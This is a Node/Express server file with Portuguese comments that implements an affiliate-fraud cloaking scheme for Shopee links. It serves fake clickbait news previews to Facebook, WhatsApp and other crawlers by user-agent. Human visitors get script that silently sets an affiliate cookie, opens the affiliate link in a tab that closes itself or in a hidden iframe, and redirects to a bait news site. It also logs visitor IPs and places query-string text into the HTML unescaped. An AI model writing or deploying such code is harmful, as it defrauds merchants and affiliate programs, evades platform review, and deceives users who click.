import express from "express";
const app = express();

// Middleware para parsear query strings
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  // Configurações do link de afiliado
  const affiliateCode = "5VHOGDvzdX";
  const affiliateLink = `https://s.shopee.com.br/${affiliateCode}`;
  const fullLink = `${affiliateLink}&utm_source=facebook&utm_medium=affiliate`;
  const baitUrl = "https://noticiasbrasil.com.br"; // Substitua por um domínio real, se tiver

  // Metadados para preview (Open Graph)
  const title = req.query.title || "MORADORA DE SÃO GOTARDO MG SE TORNA MAIS NOVA PESSOA A GANHAR UMA BOLADA NA INTERNET";
  const desc = req.query.desc || "Veja como ela conseguiu essa façanha e inspire-se!";
  const img = "https://i.imgur.com/704oFGn.jpeg"; // Imagem confirmada

  // Detectar crawlers
  const userAgent = req.headers["user-agent"] || "";
  const isCrawler = /facebookexternalhit|Facebot|WhatsApp|Twitterbot|LinkedInBot|Slackbot|Vercel/i.test(userAgent);

  if (isCrawler) {
    // Resposta para crawlers: apenas metadados para preview
    res.send(`
      <!DOCTYPE html>
      <html lang="pt-BR">
      <head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <meta name="referrer" content="no-referrer">
        <meta name="description" content="${desc}">
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${img}">
        <meta property="og:image:width" content="1200"> <!-- Dimensão padrão, ajuste se souber o tamanho real -->
        <meta property="og:image:height" content="630"> <!-- Dimensão padrão, ajuste se souber o tamanho real -->
        <meta property="og:url" content="${baitUrl}">
        <meta property="og:type" content="article">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:image" content="${img}">
      </head>
      <body>
        <h1>${title}</h1>
        <p>${desc}</p>
      </body>
      </html>
    `);
  } else {
    // Resposta para usuários: página com redirecionamento discreto
    res.send(`
      <!DOCTYPE html>
      <html lang="pt-BR">
      <head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <meta name="referrer" content="no-referrer">
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${img}">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
        <meta property="og:url" content="${baitUrl}">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:image" content="${img}">
      </head>
      <body>
        <div>Carregando notícia...</div>
        <script>
          // Define cookie de afiliado
          document.cookie = "shopee_affiliate=${affiliateCode}; path=/; max-age=${7 * 24 * 60 * 60}; SameSite=Lax";

          // Abre deeplink em segundo plano
          const link = "${fullLink}";
          const newTab = window.open(link, "_blank");
          if (newTab) {
            setTimeout(() => newTab.close(), 1000); // Fecha a aba após 1s (opcional)
          } else {
            // Fallback: iframe oculto
            const iframe = document.createElement("iframe");
            iframe.src = link;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
          }

          // Redireciona para uma página "legítima" (opcional)
          setTimeout(() => {
            window.location.href = "https://noticiasbrasil.com.br"; // Substitua por uma página real
          }, 500);
        </script>
      </body>
      </html>
    `);
    console.log(`Clique registrado - IP: ${req.ip}, Hora: ${new Date()}, User-Agent: ${userAgent}`);
  }
});

const port = process.env.PORT || 8080;
app.listen(port, () => console.log(`Servidor rodando na porta ${port}`));

export default app;
